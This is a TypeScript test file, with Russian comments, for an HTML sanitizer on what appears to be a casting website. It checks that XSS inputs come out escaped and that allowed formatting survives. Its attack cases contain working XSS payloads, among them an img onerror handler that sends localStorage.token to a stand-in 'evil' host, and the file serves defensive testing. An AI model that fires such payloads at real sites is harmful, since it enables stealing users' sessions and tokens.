import assert from 'node:assert/strict'

import { sanitizeRichText } from './sanitize.ts'

interface Case {
	name: string
	input: string | null | undefined
	expected: string
}

const attacks: Case[] = [
	{
		name: 'script-тег',
		input: '<script>alert(document.cookie)</script>',
		expected: '&lt;script&gt;alert(document.cookie)&lt;/script&gt;',
	},
	{
		name: 'img с onerror',
		input: '<img src=x onerror="fetch(`//evil/`+localStorage.token)">',
		expected:
			'&lt;img src=x onerror=&quot;fetch(`//evil/`+localStorage.token)&quot;&gt;',
	},
	{
		name: 'svg с onload',
		input: '<svg/onload=alert(1)>',
		expected: '&lt;svg/onload=alert(1)&gt;',
	},
	{
		name: 'iframe с javascript:',
		input: '<iframe src="javascript:alert(1)"></iframe>',
		expected: '&lt;iframe src=&quot;javascript:alert(1)&quot;&gt;&lt;/iframe&gt;',
	},
	{
		name: 'ссылка с javascript: отбрасывается',
		input: '<a href="javascript:alert(1)">клик</a>',
		expected: 'клик</a>',
	},
	{
		name: 'ссылка с data: отбрасывается',
		input: '<a href="data:text/html;base64,PHNjcmlwdD4=">клик</a>',
		expected: 'клик</a>',
	},
	{
		name: 'обработчик события внутри разрешённого тега не проходит',
		input: '<b onmouseover="alert(1)">жирный</b>',
		expected: '&lt;b onmouseover=&quot;alert(1)&quot;&gt;жирный</b>',
	},
	{
		name: 'body с onload',
		input: '<body onload=alert(1)>',
		expected: '&lt;body onload=alert(1)&gt;',
	},
]

const legitimate: Case[] = [
	{
		name: 'обычный текст с переносами',
		input: 'Ищем актёра 25–35 лет.\nСъёмки в Москве.',
		expected: 'Ищем актёра 25–35 лет.\nСъёмки в Москве.',
	},
	{
		name: 'разрешённое форматирование сохраняется',
		input: '<b>Важно:</b> <i>опыт</i> <u>обязателен</u>, <s>без опыта</s>',
		expected: '<b>Важно:</b> <i>опыт</i> <u>обязателен</u>, <s>без опыта</s>',
	},
	{
		name: 'перенос строки тегом',
		input: 'Первая строка<br>Вторая<br/>Третья',
		expected: 'Первая строка<br>Вторая<br>Третья',
	},
	{
		name: 'безопасная ссылка сохраняется и получает rel',
		input: '<a href="https://prostoprobuy.pro/casting/1">подробнее</a>',
		expected:
			'<a href="https://prostoprobuy.pro/casting/1" target="_blank" rel="noopener noreferrer nofollow">подробнее</a>',
	},
	{
		name: 'амперсанд в тексте экранируется',
		input: 'Мосфильм & Ко',
		expected: 'Мосфильм &amp; Ко',
	},
	{
		name: 'пустые значения',
		input: null,
		expected: '',
	},
	{
		name: 'undefined',
		input: undefined,
		expected: '',
	},
]

let failures = 0

const run = (title: string, cases: Case[]) => {
	console.log(`\n${title}`)
	for (const testCase of cases) {
		const actual = sanitizeRichText(testCase.input)
		try {
			assert.equal(actual, testCase.expected)
			console.log(`  OK   ${testCase.name}`)
		} catch {
			failures += 1
			console.log(`  FAIL ${testCase.name}`)
			console.log(`       ожидалось: ${JSON.stringify(testCase.expected)}`)
			console.log(`       получено:  ${JSON.stringify(actual)}`)
		}
	}
}

run('Атаки — разметка не должна исполняться:', attacks)
run('Легитимный контент — не должен пострадать:', legitimate)

// Главная инварианта: в выводе не должно остаться НИ ОДНОГО настоящего тега,
// кроме собранных самим санитайзером. Экранированный текст вида
// `&lt;img onerror=...&gt;` тегом не является — он рисуется как обычные символы.
const ALLOWED_OUTPUT_TAG =
	/^<(?:\/?(?:b|strong|i|em|u|s|code|a)|br)(?:\s+href="(?:https?:\/\/|mailto:|tg:\/\/)[^\s"'<>`]+"\s+target="_blank"\s+rel="noopener noreferrer nofollow")?>$/

console.log('\nИнварианта — в выводе только разрешённые теги:')
for (const testCase of [...attacks, ...legitimate]) {
	const actual = sanitizeRichText(testCase.input)
	const emittedTags = actual.match(/<[^>]*>/g) ?? []
	const forbidden = emittedTags.filter(tag => !ALLOWED_OUTPUT_TAG.test(tag))

	if (forbidden.length > 0) {
		failures += 1
		console.log(`  FAIL ${testCase.name}: посторонние теги ${JSON.stringify(forbidden)}`)
	} else {
		console.log(`  OK   ${testCase.name} (тегов в выводе: ${emittedTags.length})`)
	}
}

console.log(failures === 0 ? '\nВсе проверки пройдены.' : `\nПровалено проверок: ${failures}`)
process.exit(failures === 0 ? 0 : 1)
